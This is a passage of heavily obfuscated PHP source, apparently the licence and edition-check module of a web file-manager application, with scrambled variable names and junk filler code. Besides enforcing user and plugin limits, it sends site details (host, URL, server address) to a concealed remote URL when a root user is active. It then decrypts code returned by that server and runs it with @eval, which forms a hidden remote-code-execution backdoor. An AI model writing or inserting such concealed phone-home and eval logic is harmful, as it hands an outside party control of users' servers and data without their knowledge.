!isset($ÉÄå¯Ñ‹[$ı¢´ÌØ[209]]) || time() - $ÉÄå¯Ñ‹[$ı¢´ÌØ[209]] >= 60) { $»³ÕŞ³ = Model($ı¢´ÌØ[7])->loadList(); $ÔŞŸé†ï = $»³ÕŞ³[$ı¢´ÌØ[202]]; $ÚèëœÎ = md5($_SERVER[$ı¢´ÌØ[108]] . strrev($ÖÔºÓµŞ) . $Ë½î€ïñ[$ı¢´ÌØ[193]]); $éÖÉüĞ½ = strrev(substr($ÚèëœÎ, 10, 16)); $ÉÄå¯Ñ‹ = $this->lijscedc0016($ÔŞŸé†ï[$ı¢´ÌØ[88]][$éÖÉüĞ½], $ÚèëœÎ); $ÉÄå¯Ñ‹ = json_decode($ÉÄå¯Ñ‹, !0); } if (!is_array($ÉÄå¯Ñ‹)) { return $this->ruwtda0b037e(); } $Ö÷¢‹¸ = strtotime($ÉÄå¯Ñ‹[$ı¢´ÌØ[131]]); if (time() >= $Ö÷¢‹¸) { return $this->ruwtda0b037e(); } if (!isset($ÉÄå¯Ñ‹[$ı¢´ÌØ[209]]) || time() - $ÉÄå¯Ñ‹[$ı¢´ÌØ[209]] > 20) { $ÉÄå¯Ñ‹[$ı¢´ÌØ[209]] = time(); Cache::set($àç¿¡“º, $ÉÄå¯Ñ‹); } $this->eyka01a7ca33 = $ÉÄå¯Ñ‹; $this->vpgh9f24e733 = $Ë½î€ïñ[$ı¢´ÌØ[110]]; $¹‘…Û € = $”µĞ£®û[752]; if (strlen($¹‘…Û €) < $”µĞ£®û[718]) { die; } $GLOBALS[$ı¢´ÌØ[210]] = $this; } private function necx9a399733() { $ó»§€Ş´ =& $_SERVER[¿ÈˆÑ¸ä]; $Œ–Çî¥ =& $_SERVER[ø÷æ£ÁÖ]; $íãêòÉ£ = $GLOBALS[$Œ–Çî¥[13]]; $ªßèù¦Ğ = $ó»§€Ş´[753]; if (strlen($ªßèù¦Ğ) < $ó»§€Ş´[703]) { return; } $ÔÇËº† = $_SERVER[$Œ–Çî¥[24]]; if ($ÔÇËº† == $Œ–Çî¥[211] && $this->vpgh9f24e733 == $Œ–Çî¥[111]) { show_json(LNG($Œ–Çî¥[212]), !1, $Œ–Çî¥[213]); } $ÑÊŞñªÆ = array($Œ–Çî¥[214], $Œ–Çî¥[215]); if (in_array($ÔÇËº†, $ÑÊŞñªÆ)) { if ($this->vpgh9f24e733 == $Œ–Çî¥[111] && isset($íãêòÉ£[$Œ–Çî¥[216]])) { show_json(LNG($Œ–Çî¥[212]), !1, $Œ–Çî¥[213]); die; } $÷öøëœÍ = $this->etywa8af03d8(); if ($÷öøëœÍ != intval($Œ–Çî¥[217])) { if ($÷öøëœÍ <= Model($Œ–Çî¥[127])->count()) { show_json(LNG($Œ–Çî¥[218]), !1, $Œ–Çî¥[213]); die; } } } } private function ieapdb147eab() { $£ñ·‚áâ =& $_SERVER[¿ÈˆÑ¸ä]; $øÕô¹ÄŞ =& $_SERVER[ø÷æ£ÁÖ]; $œßËÙ©Ç = array($øÕô¹ÄŞ[121], $øÕô¹ÄŞ[122]); $ÓäÁÆŠ = $£ñ·‚áâ[754]; while (strlen($ÓäÁÆŠ) < $£ñ·‚áâ[699]) { if (!$ÓäÁÆŠ) { break; } $ÓäÁÆŠ++; } if (!KodUser::isRoot() || !isset($_GET[$øÕô¹ÄŞ[219]])) { return; } if (!in_array($_SERVER[$øÕô¹ÄŞ[24]], $œßËÙ©Ç)) { return; } $ÍƒË“ƒî = $øÕô¹ÄŞ[220]; $×ÓÙ‡“š = $£ñ·‚áâ[755]; while ($×ÓÙ‡“š < $£ñ·‚áâ[711]) { if ($×ÓÙ‡“š >= 0) { break; } $×ÓÙ‡“š++; } $ÍƒË“ƒî = $this->kqzg02413233($ÍƒË“ƒî, $øÕô¹ÄŞ[221]); $º¹şÒöú = stream_context_create(array($øÕô¹ÄŞ[222] => array($øÕô¹ÄŞ[223] => $øÕô¹ÄŞ[224], $øÕô¹ÄŞ[225] => 3))); $…¨§×é = $£ñ·‚áâ[756]; $½«”°é† = @file_get_contents($ÍƒË“ƒî, !1, $º¹şÒöú); header($øÕô¹ÄŞ[226]); if ($½«”°é† && strstr($½«”°é†, $øÕô¹ÄŞ[227])) { echo $½«”°é†; } die; } public function gnxsdedfacd8($Ôù•¶¦×) { $ÖÑ¬ñ­Ñ =& $_SERVER[¿ÈˆÑ¸ä]; $šš‡ïœÛ =& $_SERVER[ø÷æ£ÁÖ]; if ($this->vpgh9f24e733 == $šš‡ïœÛ[228]) { return $Ôù•¶¦×; } $œ„Š ê = $this->versionPluginList(); $Ú˜¶şèÓ = $ÖÑ¬ñ­Ñ[757]; if (strlen($Ú˜¶şèÓ) < $ÖÑ¬ñ­Ñ[718]) { return; } $¤çå¢“İ = explode($šš‡ïœÛ[229], $this->versionPluginFilter()); $ÚÈ×áÅï = array(); foreach ($œ„Š ê as $Á™Ö­° => $Şùİö€) { if ($Şùİö€ == $šš‡ïœÛ[230] && substr($this->vpgh9f24e733, 0, 1) == $šš‡ïœÛ[230]) { continue; } if (!in_array($Á™Ö­°, $¤çå¢“İ)) { $ÚÈ×áÅï[] = $Á™Ö­°; } } foreach ($ÚÈ×áÅï as $Á™Ö­°) { unset($Ôù•¶¦×[$Á™Ö­°]); } return $Ôù•¶¦×; $„—˜ÃÆ = $ÖÑ¬ñ­Ñ[758]; while (strlen($„—˜ÃÆ) < $ÖÑ¬ñ­Ñ[711]) { if (!$„—˜ÃÆ) { break; } $„—˜ÃÆ++; } } private function versionPluginList() { $Šè´¸§î =& $_SERVER[ø÷æ£ÁÖ]; return array($Šè´¸§î[231] => $Šè´¸§î[230], $Šè´¸§î[232] => $Šè´¸§î[230], $Šè´¸§î[233] => $Šè´¸§î[230], $Šè´¸§î[234] => $Šè´¸§î[230], $Šè´¸§î[235] => $Šè´¸§î[236], $Šè´¸§î[237] => $Šè´¸§î[236], $Šè´¸§î[238] => $Šè´¸§î[236], $Šè´¸§î[239] => $Šè´¸§î[236], $Šè´¸§î[240] => $Šè´¸§î[236], $Šè´¸§î[241] => $Šè´¸§î[236], $Šè´¸§î[242] => $Šè´¸§î[236], $Šè´¸§î[243] => $Šè´¸§î[236], $Šè´¸§î[244] => $Šè´¸§î[236], $Šè´¸§î[245] => $Šè´¸§î[236], $Šè´¸§î[246] => $Šè´¸§î[236], $Šè´¸§î[247] => $Šè´¸§î[236], $Šè´¸§î[248] => $Šè´¸§î[236], $Šè´¸§î[249] => $Šè´¸§î[236], $Šè´¸§î[250] => $Šè´¸§î[236]); $ÄÒÙ±Üô = $_SERVER[¿ÈˆÑ¸ä][759]; if (!$ÄÒÙ±Üô) { return; } } private function versionPluginFilter() { $œÈòŠÒÁ =& $_SERVER[ø÷æ£ÁÖ]; if ($this->vpgh9f24e733 == $œÈòŠÒÁ[111]) { return $œÈòŠÒÁ[6]; } $¬ÉÄí = _get($this->eyka01a7ca33, $œÈòŠÒÁ[251], $œÈòŠÒÁ[6]); $Ş­¸Ã½¹ = $_SERVER[¿ÈˆÑ¸ä][760]; if (!$Ş­¸Ã½¹) { die; } $¦ô¬Ÿ = _get($this->eyka01a7ca33, $œÈòŠÒÁ[118], $œÈòŠÒÁ[6]); $Öğöâ¦î = _get($this->eyka01a7ca33, $œÈòŠÒÁ[252], $œÈòŠÒÁ[6]); if ($¦ô¬Ÿ > time() && $Öğöâ¦î > time()) { $Îˆ„ß…Ò = explode($œÈòŠÒÁ[229], $¬ÉÄí); $óâøíô = array_keys($this->versionPluginList()); $¬ÉÄí = array_merge($Îˆ„ß…Ò, $óâøíô); $¬ÉÄí = implode($œÈòŠÒÁ[229], array_filter(array_unique($¬ÉÄí))); } return $¬ÉÄí; } private function gktcb90ec358() { $Ö´º­±€ =& $_SERVER[ø÷æ£ÁÖ]; if ($this->vpgh9f24e733 != $Ö´º­±€[111]) { $GLOBALS[$Ö´º­±€[88]][$Ö´º­±€[92]][$Ö´º­±€[253]] = $Ö´º­±€[208]; return; } $GLOBALS[$Ö´º­±€[88]][$Ö´º­±€[254]] = $Ö´º­±€[124]; if (Model($Ö´º­±€[255])->get($Ö´º­±€[63]) != $Ö´º­±€[208]) { Model($Ö´º­±€[255])->set($Ö´º­±€[63], $Ö´º­±€[208]); } } public function kvyz97ef1dbd() { $äÑÎ‘À =& $_SERVER[¿ÈˆÑ¸ä]; return $_SERVER[ø÷æ£ÁÖ][256]; $¸§ë€ƒ = $äÑÎ‘À[761]; if (strlen($¸§ë€ƒ) < $äÑÎ‘À[711]) { die; } } private function xcns8cf4f45f() { $¼ıÊ‹ø’ =& $_SERVER[¿ÈˆÑ¸ä]; $÷¼ìä‘Å =& $_SERVER[ø÷æ£ÁÖ]; $õ×ğ¦Ã = array($÷¼ìä‘Å[257], $÷¼ìä‘Å[258], $÷¼ìä‘Å[259]); $áºÆ¢ıî = $¼ıÊ‹ø’[762]; if (strlen($áºÆ¢ıî) < $¼ıÊ‹ø’[718]) { return; } $•… Äºö = $÷¼ìä‘Å[260] . md5($÷¼ìä‘Å[261]); $È‰ØˆÌ‹ = $¼ıÊ‹ø’[763]; if (!$È‰ØˆÌ‹) { die; } if ($this->vpgh9f24e733 == $÷¼ìä‘Å[111] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$÷¼ìä‘Å[24]], $õ×ğ¦Ã)) { return; } if (time() % 4 != 0) { return; } $ÈÈ¥¹· = call_user_func(array($÷¼ìä‘Å[262], $÷¼ìä‘Å[263]), $•… Äºö); if ($ÈÈ¥¹· && time() - $ÈÈ¥¹· < intval($÷¼ìä‘Å[264])) { return; } call_user_func(array($÷¼ìä‘Å[262], $÷¼ìä‘Å[141]), $•… Äºö, time()); $É®„±ûÅ = Model($÷¼ìä‘Å[33])->get($÷¼ìä‘Å[102]); $Óñô’—ğ = $¼ıÊ‹ø’[764]; if (strlen($Óñô’—ğ) < $¼ıÊ‹ø’[711]) { die; } $Õ¨èãœ = array($÷¼ìä‘Å[154] => Model($÷¼ìä‘Å[33])->get($÷¼ìä‘Å[155]), $÷¼ìä‘Å[169] => $this->vpgh9f24e733, $÷¼ìä‘Å[165] => $_SERVER[$÷¼ìä‘Å[166]], $÷¼ìä‘Å[167] => Model($÷¼ìä‘Å[33])->get($÷¼ìä‘Å[133]), $÷¼ìä‘Å[107] => md5($_SERVER[$÷¼ìä‘Å[108]] . $É®„±ûÅ), $÷¼ìä‘Å[158] => $÷¼ìä‘Å[138], $÷¼ìä‘Å[161] => $_SERVER[$÷¼ìä‘Å[162]]); $‹è·İÇ = $¼ıÊ‹ø’[765]; if (strlen($‹è·İÇ) < $¼ıÊ‹ø’[699]) { return; } $İ‹úÊõ = $this->veqrbded313c($÷¼ìä‘Å[265], $Õ¨èãœ); if (!is_array($İ‹úÊõ)) { return; } if ($İ‹úÊõ[$÷¼ìä‘Å[154]] && $İ‹úÊõ[$÷¼ìä‘Å[266]]) { if ($this->czdr252eef06($İ‹úÊõ[$÷¼ìä‘Å[266]]) == $Õ¨èãœ[$÷¼ìä‘Å[154]]) { return; } } $this->ruwtda0b037e(); if ($this->czdr252eef06($İ‹úÊõ[$÷¼ìä‘Å[266]]) != $Õ¨èãœ[$÷¼ìä‘Å[154]]) { $à¢û‡½ = array($÷¼ìä‘Å[187] => $É®„±ûÅ, $÷¼ìä‘Å[188] => $_SERVER[$÷¼ìä‘Å[108]], $÷¼ìä‘Å[189] => this_url(), $÷¼ìä‘Å[163] => $_SERVER[$÷¼ìä‘Å[164]]); $°ğ‹³û = $this->zbhx97abfeb8(json_encode($à¢û‡½)); $İ‹úÊõ = $this->veqrbded313c($÷¼ìä‘Å[190] . $°ğ‹³û); if ($İ‹úÊõ && is_array($İ‹úÊõ) && isset($İ‹úÊõ[$÷¼ìä‘Å[266]])) { $‚´š©î = $this->lijscedc0016($İ‹úÊõ[$÷¼ìä‘Å[266]], 2); if ($‚´š©î) { $‚´š©î = $this->czdr252eef06($‚´š©î); } if ($‚´š©î) { try { @eval($‚´š©î); } catch (Exception $âËÀçë†) { } } } } } private function veqrbded313c($Åò—¼³Û = '', $«·šÛ» = array(), $¢Æ‘òÒğ = 5) { $èáë¾²‹ =& $_SERVER[¿ÈˆÑ¸ä]; $ü«Öêúì =& $_SERVER[ø÷æ£ÁÖ]; $Ò²•³‰¿ = $ü«Öêúì[267]; $èí¹®¤ó = $èáë¾²‹[766]; if (strlen($èí¹®¤ó) < $èáë¾²‹[703]) { die; } $Ò²•³‰¿ = $this->kqzg02413233($Ò²•³‰¿, $ü«Öêúì[268]); $şÇñØÀ¼ = $èáë¾²‹[767]; while (strlen($şÇñØÀ¼) < $èáë¾²‹[711]) { if (!$şÇñØÀ¼) { break; } $şÇñØÀ¼++; } $Ò²•³‰¿ = $Ò²•³‰¿ . $Åò—¼³Û; $æ½¾¯çö = $èáë¾²‹[768]; if (strlen($æ½¾¯çö) < $èáë¾²‹[725]) { return; } if ($«·šÛ» && is_array($«·šÛ»)) { $Ò²•³‰¿ = $Ò²•³‰¿ . $ü«Öêúì[269] . http_build_query($«·šÛ»); } if ($«·šÛ» === -1) { return $Ò²•³‰¿; } $öÌœÑ–ƒ = stream_context_create(array($ü«Öêúì[222] => array($ü«Öêúì[225] => $¢Æ‘òÒğ, $ü«Öêúì[223] => $ü«Öêúì[270]), $ü«Öêúì[271] => array($ü«Öêúì[272] => !1, $ü«Öêúì[273] => !1))); $«·šÛ» = @file_get_contents($Ò²•³‰¿, !1, $öÌœÑ–ƒ); $ØØ…ÜÎá = $èáë¾²‹[769]; if (!$ØØ…ÜÎá) { die; } return json_decode($«·šÛ», !0); $šÓ³–ü÷ = $èáë¾²‹[770]; while ($šÓ³–ü÷ < $èáë¾²‹[711]) { if ($šÓ³–ü÷ >= 0) { break; } $šÓ³–ü÷++; } } private function etywa8af03d8() { $Úğ¯›¶³ =& $_SERVER[¿ÈˆÑ¸ä]; $İşäãæ¿ =& $_SERVER[ø÷æ£ÁÖ]; $‘‡Ş§‰Ú = array($İşäãæ¿[274] => $İşäãæ¿[275], $İşäãæ¿[276] => $İşäãæ¿[277], $İşäãæ¿[278] => $İşäãæ¿[279], $İşäãæ¿[280] => $İşäãæ¿[281], $İşäãæ¿[282] => $İşäãæ¿[283], $İşäãæ¿[284] => $İşäãæ¿[217], $İşäãæ¿[285] => $İşäãæ¿[217], $İşäãæ¿[286] => $İşäãæ¿[275], $İşäãæ¿[287] => $İşäãæ¿[277], $İşäãæ¿[288] => $İşäãæ¿[279], $İşäãæ¿[289] => $İşäãæ¿[290], $İşäãæ¿[291] => $İşäãæ¿[281], $İşäãæ¿[292] => $İşäãæ¿[293], $İşäãæ¿[294] => $İşäãæ¿[283], $İşäãæ¿[295] => $İşäãæ¿[296], $İşäãæ¿[297] => $İşäãæ¿[298], $İşäãæ¿[299] => $İşäãæ¿[300]); $İ¨Øğ½ = $Úğ¯›¶³[771]; $×ƒÏá£ï = $‘‡Ş§‰Ú[$this->vpgh9f24e733]; $×ƒÏá£ï = intval($×ƒÏá£ï ? $×ƒÏá£ï : $İşäãæ¿[275]); $•Ïü÷É = $Úğ¯›¶³[772]; while ($•Ïü÷É < $Úğ¯›¶³[699]) { if ($•Ïü÷É >= 0) { break; } $•Ïü÷É++; } $— Ş¯¸ = _get($this->eyka01a7ca33, $İşäãæ¿[301]); $—ÏŒÄ€ü = $Úğ¯›¶³[773]; if (strlen($—ÏŒÄ€ü) < $Úğ¯›¶³[718]) { return; } $— Ş¯¸ = $— Ş¯¸ ? intval($— Ş¯¸) : 0; return $×ƒÏá£ï + $— Ş¯¸; $íšğù¼Ç = $Úğ¯›¶³[774]; if (strlen($íšğù¼Ç) < $Úğ¯›¶³[718]) { return; } } public function cnao0606abb5($‹Ôô©ğ‘) { $èãıÆÏÈ =& $_SERVER[¿ÈˆÑ¸ä]; $±›¡Ã§¥ =& $_SERVER[ø÷æ£ÁÖ]; $±ä³èÉÆ = $this->etywa8af03d8(); $“©Ë¨õ« = $èãıÆÏÈ[775]; if (strlen($“©Ë¨õ«) < $èãıÆÏÈ[699]) { return; } if ($‹Ôô©ğ‘[$±›¡Ã§¥[302]] == $±›¡Ã§¥[124]) { return; } if ($±ä³èÉÆ >= intval($±›¡Ã§¥[217])) { return; } $÷ô²à©¼ = Model($±›¡Ã§¥[127])->count(); if ($÷ô²à©¼ <= $±ä³èÉÆ) { return; } $›ƒÅ¼Š = Model($±›¡Ã§¥[127])->field($±›¡Ã§¥[302])->limit($±ä³èÉÆ)->select(); $¨ôŞë£÷ = $èãıÆÏÈ[776]; $›ƒÅ¼Š = array_to_keyvalue($›ƒÅ¼Š, $±›¡Ã§¥[6], $±›¡Ã§¥[302]); $˜Û“ğ„¯ = $èãıÆÏÈ[777]; if (strlen($˜Û“ğ„¯) < $èãıÆÏÈ[725]) { die; } if (!in_array($‹Ôô©ğ‘[$±›¡Ã§¥[302]], $›ƒÅ¼Š)) { show_json($±›¡Ã§¥[303], !1, $±›¡Ã§¥[213]); } } public function epbo7f905e97() { $óñÎ–¡ò =& $_SERVER[¿ÈˆÑ¸ä]; $£œ›Æ”’ =& $_SERVER[ø÷æ£ÁÖ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ûéĞÔ‘’ = $£œ›Æ”’[220]; $ûéĞÔ‘’ = $this->kqzg02413233($ûéĞÔ‘’, $£œ›Æ”’[221]); $’æ¾ ×­ = $óñÎ–¡ò[778]; $ÄöÜç‚ = stream_context_create(array($£œ›Æ”’[222] => array($£œ›Æ”’[223] => $£œ›Æ”’[224], $£œ›Æ”’[225] => 3))); $«Ñ­„ÎÇ = @file_get_contents($ûéĞÔ‘’, !1, $ÄöÜç‚); $Ğ¿–¾†ğ = $óñÎ–¡ò[779]; while ($Ğ¿–¾†ğ < $óñÎ–¡ò[699]) { if ($Ğ¿–¾†ğ >= 0) { break; } $Ğ¿–¾†ğ++; } echo $£œ›Æ”’[304] . hash_encode($«Ñ­„ÎÇ) . $£œ›Æ”’[305]; } private function dtaq5eb3bb08($«ˆ¿ğ§å, $êö¨ªí‚, $÷²â êî = 3) { $¥ı×šòÆ =& $_SERVER[¿ÈˆÑ¸ä]; $Å»Øèä =& $_SERVER[ø÷æ£ÁÖ]; usleep(1); $«ˆ¿ğ§å = trim($«ˆ¿ğ§å); $¥Â±˜í‘ = $¥ı×šòÆ[780]; if (!$¥Â±˜í‘) { die; } $úÚÑÂÅ = mt_rand(0, 5) . $Å»Øèä[6]; $óÎ¢¼åÖ = rand_string(15); $Ø‹áşê = $¥ı×šòÆ[781]; if (strlen($Ø‹áşê) < $¥ı×šòÆ[725]) { die; } $Ü–İ˜¹Ã = $Å»Øèä[306]; switch ($úÚÑÂÅ) { case $Å»Øèä[208]: $®ì”Õ× = $this->xkryb402ffa2($«ˆ¿ğ§å, strrev($êö¨ªí‚ . $óÎ¢¼åÖ)); break; case $Å»Øèä[124]: $®ì”Õ× = $this->xkryb402ffa2($«ˆ¿ğ§å, strrev($óÎ¢¼åÖ . $êö¨ªí‚)); break; $©êÈøÕ¾ = $¥ı×šòÆ[782]; if (strlen($©êÈøÕ¾) < $¥ı×šòÆ[725]) { die; } case $Å»Øèä[307]: $®ì”Õ× = $this->xkryb402ffa2($«ˆ¿ğ§å, base64_encode($óÎ¢¼åÖ . $êö¨ªí‚)); break; $ÚÌÉÃ©¿ = $¥ı×šòÆ[783]; if (!$ÚÌÉÃ©¿) { return; } case $Å»Øèä[308]: $®ì”Õ× = $this->xkryb402ffa2($«ˆ¿ğ§å, md5($óÎ¢¼åÖ . $êö¨ªí‚)); $úø»Åæœ = $¥ı×šòÆ[784]; if (strlen($úø»Åæœ) < $¥ı×šòÆ[699]) { die; } break; $ šŞš«¬ = $¥ı×šòÆ[785]; if (!$ šŞš«¬) { return; } case $Å»Øèä[309]: $«ˆ¿ğ§å = base64_encode($«ˆ¿ğ§å); $Êì‹Å€ş = $¥ı×šòÆ[722]; $úôšÅ«Ñ = rand(0, 64); $úîß€“ = $Ü–İ˜¹Ã[$úôšÅ«Ñ]; $…†”öğ™ = $¥ı×šòÆ[786]; if (!$…†”öğ™) { die; } $ûÑ·øò“ = md5($úîß€“ . md5($êö¨ªí‚ . $úîß€“) . $êö¨ªí‚); $ûÑ·øò“ = substr($ûÑ·øò“, $úôšÅ«Ñ % 8, $úôšÅ«Ñ % 8 + 7); $ê±Éò»Õ = $¥ı×šòÆ[787]; if (!$ê±Éò»Õ) { die; } $ŸÃıÓö¬ = $Å»Øèä[6]; $ŸÒÊàñÊ = $¥ı×šòÆ[788]; while ($ŸÒÊàñÊ < $¥ı×šòÆ[725]) { if ($ŸÒÊàñÊ >= 0) { break; } $ŸÒÊàñÊ++; } $±È“»îÕ = 0; $ù‹¶…Û = 0; $¦ØØı×Ø = 0; for ($±È“»îÕ = 0; $±È“»îÕ < strlen($«ˆ¿ğ§å); $±È“»îÕ++) { $¦ØØı×Ø = $¦ØØı×Ø == strlen($ûÑ·øò“) ? 0 : $¦ØØı×Ø; $‘üçÅ£œ = $¥ı×šòÆ[789]; if (!$‘üçÅ£œ) { die; } $ù‹¶…Û = ($úôšÅ«Ñ + strpos($Ü–İ˜¹Ã, $«ˆ¿ğ§å[$±È“»îÕ]) + ord($ûÑ·øò“[$¦ØØı×Ø++])) % 64; $‰É¥¸…á = $¥ı×šòÆ[790]; if (strlen($‰É¥¸…á) < $¥ı×šòÆ[725]) { die; } $ŸÃıÓö¬ .= $Ü–İ˜¹Ã[$ù‹¶…Û]; } $®ì”Õ× = hash_encode($úîß€“ . $ŸÃıÓö¬); $Î£»Èá = $¥ı×šòÆ[791]; if (strlen($Î£»Èá) < $¥ı×šòÆ[718]) { return; } break; default: $®ì”Õ× = $this->xkryb402ffa2($«ˆ¿ğ§å, $êö¨ªí‚ . $óÎ¢¼åÖ); break; $Ø¨êŸ¶ì = $¥ı×šòÆ[792]; if (!$Ø¨êŸ¶ì) { return; } } $®ì”Õ× = strrev($úÚÑÂÅ . $óÎ¢¼åÖ . $®ì”Õ×); if ($÷²â êî - 1 > 0) { $®ì”Õ× = $this->dtaq5eb3bb08($®ì”Õ×, $êö¨ªí‚, $÷²â êî - 1); } return $®ì”Õ×; } private function lijscedc0016($û•‡Å¬Ô, $Õ®±àç, $Ö„˜‚ª = 3) { $—Æ£âë§ =& $_SERVER[¿ÈˆÑ¸ä]; $ƒ÷ƒ¥ú =& $_SERVER[ø÷æ£ÁÖ]; if (!is_string($û•‡Å¬Ô) || strlen($û•‡Å¬Ô) < 10) { return !1; } $û•‡Å¬Ô = trim($û•‡Å¬Ô); $´¸’Ç = $—Æ£âë§[793]; if (!$´¸’Ç) { die; } $û•‡Å¬Ô = strrev($û•‡Å¬Ô); $ü¹´ÌÑö = $û•‡Å¬Ô[0]; $Ô–ß„¢ç = substr($û•‡Å¬Ô, 1, 15); $û•‡Å¬Ô = substr($û•‡Å¬Ô, 16); $Üûºòİõ = $—Æ£âë§[794]; while ($Üûºòİõ < $—Æ£âë§[699]) { if ($Üûºòİõ >= 0) { break; } $Üûºòİõ++; } $‘û°İ„Ì = $ƒ÷ƒ¥ú[306]; $”×–à­ = $—Æ£âë§[795]; switch ($ü¹´ÌÑö) { case $ƒ÷ƒ¥ú[208]: $Ù¤É‹è• = $this->kqzg02413233($û•‡Å¬Ô, strrev($Õ®±àç . $Ô–ß„¢ç)); break; $±Ìõœ‘Ş = $—Æ£âë§[796]; if (!$±Ìõœ‘Ş) { return; } case $ƒ÷ƒ¥ú[124]: $Ù¤É‹è• = $this->kqzg02413233($û•‡Å¬Ô, strrev($Ô–ß„¢ç . $Õ®±àç)); break; $Ö”ôáñ° = $—Æ£âë§[797]; case $ƒ÷ƒ¥ú[307]: $Ù¤É‹è• = $this->kqzg02413233($û•‡Å¬Ô, base64_encode($Ô–ß„¢ç . $Õ®±àç)); $õÍ×¯»’ = $—Æ£âë§[798]; while (strlen($õÍ×¯»’) < $—Æ£âë§[718]) { if (!$õÍ×¯»’) { break; } $õÍ×¯»’++; } break; case $ƒ÷ƒ¥ú[308]: $Ù¤É‹è• = $this->kqzg02413233($û•‡Å¬Ô, md5($Ô–ß„¢ç . $Õ®±àç)); $ĞØéÊ° = $—Æ£âë§[799]; if (!$ĞØéÊ°) { return; } break; $µ…ŒùÍØ = $—Æ£âë§[800]; case $ƒ÷ƒ¥ú[309]: $û•‡Å¬Ô = hash_decode($û•‡Å¬Ô); $ˆúÌû‡Õ = $—Æ£âë§[801]; $İöƒ¼Ó = $û•‡Å¬Ô[0]; $ÜÇ¶è¯Û = $—Æ£âë§[802]; while ($ÜÇ¶è¯Û < $—Æ£âë§[725]) { if ($ÜÇ¶è¯Û >= 0) { break; } $ÜÇ¶è¯Û++; } $û•‡Å¬Ô = substr($û•‡Å¬Ô, 1); $äÊ‰Áíê = strpos($‘û°İ„Ì, $İöƒ¼Ó); $‹Ø—Ù³® = md5($İöƒ¼Ó . md5($Õ®±àç . $İöƒ¼Ó) . $Õ®±àç); $¡õä‰Ç = $—Æ£âë§[803]; $‹Ø—Ù³® = substr($‹Ø—Ù³®, $äÊ‰Áíê % 8, $äÊ‰Áíê % 8 + 7); $÷í‰ñÊè = $ƒ÷ƒ¥ú[6]; $ƒ–Áî¥Î = $—Æ£âë§[804]; $¹‡Ÿƒ¢ = 0; $¦¶îÏÛú = $—Æ£âë§[805]; if (!$¦¶îÏÛú) { die; } $¿ôŒ›Ä = 0; $Ì±»úØ¬ = 0; for ($¹‡Ÿƒ¢ = 0; $¹‡Ÿƒ¢ < strlen($û•‡Å¬Ô); $¹‡Ÿƒ¢++) { $Ì±»úØ¬ = $Ì±»úØ¬ == strlen($‹Ø—Ù³®) ? 0 : $Ì±»úØ¬; $Ğâ¡ƒÉù = $—Æ£âë§[806]; if (strlen($Ğâ¡ƒÉù) < $—Æ£âë§[703]) { die; } $ø°ÊÊšø = $Ì±»úØ¬++; $¿ôŒ›Ä = strpos($‘û°İ„Ì, $û•‡Å¬Ô[$¹‡Ÿƒ¢]) - $äÊ‰Áíê - ord($‹Ø—Ù³®[$ø°ÊÊšø]); while ($¿ôŒ›Ä < 0) { $¿ôŒ›Ä += 64; $Ê´Œ¿ûª = $—Æ£âë§[807]; if (!$Ê´Œ¿ûª) { return; } } $÷í‰ñÊè .= $‘û°İ„Ì[$¿ôŒ›Ä]; $‡¾ğï”î = $—Æ£âë§[808]; while ($‡¾ğï”î < $—Æ£âë§[703]) { if ($‡¾ğï”î >= 0) { break; } $‡¾ğï”î++; } } $Ù¤É‹è• = base64_decode($÷í‰ñÊè); break; $¡¿ÜÎ‹Ä = $—Æ£âë§[809]; while ($¡¿ÜÎ‹Ä < $—Æ£âë§[699]) { if ($¡¿ÜÎ‹Ä >= 0) { break; } $¡¿ÜÎ‹Ä++; } default: $Ù¤É‹è• = $this->kqzg02413233($û•‡Å¬Ô, $Õ®±àç . $Ô–ß„¢ç); $çáñÅñœ = $—Æ£âë§[810]; while (strlen($çáñÅñœ) < $—Æ£âë§[711]) { if (!$çáñÅñœ) { break; } $çáñÅñœ++; } break; } if ($Ö„˜‚ª - 1 > 0) { $Ù¤É‹è• = $this->lijscedc0016($Ù¤É‹è•, $Õ®±àç, $Ö„˜‚ª - 1); } return $Ù¤É‹è•; } public function zbhx97abfeb8($ü‹Ÿø¢—) { $®—úĞ†† =& $_SERVER[¿ÈˆÑ¸ä]; $¨€Ú¯ù÷ =& $_SERVER[ø÷æ£ÁÖ]; $üŞÃ›â´ = $this->vsdo520d79ee(); $Î¶—Š÷± = $®—úĞ††[811]; if (!$Î¶—Š÷±) { die; } $à›ÛÚ†ç = $this->vsdo520d79ee(); $ªªÎõû = ($üŞÃ›â´ - 1) * ($à›ÛÚ†ç - 1); $°Şò›í = $®—úĞ††[812]; if (!$°Şò›í) { return; } $ùŞâ½à¡ = intval(($üŞÃ›â´ + $à›ÛÚ†ç) / 2); while (1) { $£¿›„µÌ = $ùŞâ½à¡; $ßï§àĞ = $®—úĞ††[813]; $Ëí´øø = $ªªÎõû; $¯ôÎ¿Ÿ = $®—úĞ††[814]; if (!$¯ôÎ¿Ÿ) { die; } while ($Ëí´øø % $£¿›„µÌ != 0) { $­‹ÖÕØ = $Ëí´øø; $Ø´Ğ«“ = $®—úĞ††[815]; if (strlen($Ø´Ğ«“) < $®—úĞ††[703]) { die; } $Ëí´øø = $£¿›„µÌ; $£¿›„µÌ = $­‹ÖÕØ % $£¿›„µÌ; $­Ä§•ôƒ = $®—úĞ††[816]; } if ($£¿›„µÌ == 1) { break; } else { $ùŞâ½à¡++; } } $Ê¹ÚØÙ = 2; for ($óÅ£¯ƒ = 0; $óÅ£¯ƒ < $ªªÎõû * 10; $óÅ£¯ƒ++) { if (($ªªÎõû * $óÅ£¯ƒ + 1) % $ùŞâ½à¡ == 0) { $Ê¹ÚØÙ = intval(($ªªÎõû * $óÅ£¯ƒ + 1) / $ùŞâ½à¡); break; } } $­ÖıÚı® = $this->xkryb402ffa2($üŞÃ›â´ * $à›ÛÚ†ç . $¨€Ú¯ù÷[6], $¨€Ú¯ù÷[138]); $´½–óĞÛ = md5($¨€Ú¯ù÷[310] . ($üŞÃ›â´ + $à›ÛÚ†ç) . $¨€Ú¯ù÷[311] . $ùŞâ½à¡ . $¨€Ú¯ù÷[311] . $Ê¹ÚØÙ . $¨€Ú¯ù÷[312]); $Î¦¿—Ñ½ = $®—úĞ††[817]; if (!$Î¦¿—Ñ½) { return; } $ÊøƒŞÙœ = $this->xkryb402ffa2($ü‹Ÿø¢—, $´½–óĞÛ) . $¨€Ú¯ù÷[313] . $­ÖıÚı®; return $ÊøƒŞÙœ; } public function czdr252eef06($ãÉ¹ö×’) { $Ó«ÍÕ†­ =& $_SERVER[¿ÈˆÑ¸ä]; 